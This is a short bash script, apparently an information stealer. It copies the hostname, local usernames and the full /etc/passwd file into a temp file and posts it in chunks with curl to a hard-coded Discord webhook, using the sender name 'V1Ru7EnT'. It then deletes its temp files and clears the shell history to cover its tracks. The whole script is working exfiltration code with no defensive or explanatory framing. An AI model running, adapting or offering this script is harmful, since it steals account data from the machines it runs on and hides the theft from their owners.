#!/bin/bash

# Set the directory to temporary
D="$TMPDIR/pass"

# Create the directory if it doesn't exist
mkdir -p "$D"

# Get the current date and time
Date=$(date +%Y-%m-%d)
Time=$(date +%H-%M-%S)

# Set the filename
FileName="${Date}_${HOSTNAME}_${Time}.txt"
FilePath="$D/$FileName"

# Output computer info
echo "$HOSTNAME" > "$FilePath"
echo "Computer Info" >> "$FilePath"

# Get local users and append to the file
awk -F: '$2 == "x" {print $1}' /etc/passwd >> "$FilePath"
cat /etc/passwd >> "$FilePath"

# Read the file content
args1=$(cat "$FilePath")

# Prepare webhook URL
webhookUrl='https://discord.com/api/webhooks/1348814707741560965/8JqGswXF_UakFLRmb7of-8KduCTgbbxFTvfM2K0MGh4DW7yPjHFxR2OZlMEGTdT1N4L5'

# Split content into chunks of 2000 characters
chunkSize=2000
length=${#args1}
chunks=$(( (length + chunkSize - 1) / chunkSize ))

for ((i = 0; i < chunks; i++)); do
    start=$((i * chunkSize))
    content="${args1:start:chunkSize}"
    jsonData=$(jq -n --arg username 'V1Ru7EnT' --arg content "$content" '{username: $username, content: $content}')

    # Send the content to the webhook
    curl -X POST -H "Content-Type: application/json" -d "$jsonData" "$webhookUrl"
    
    # Wait for 1 second
    sleep 1
done

# Empty temp folder
rm -rf "$D/pass*" 2>/dev/null

# Delete .zip file if it exists
rm -rf "$D/E.zip" 2>/dev/null

# Clear command history (if applicable)
history -c

# Empty recycle bin (depends on system, might need custom implementation)
# This functionality is not available in standard Bash; consider implementing as needed.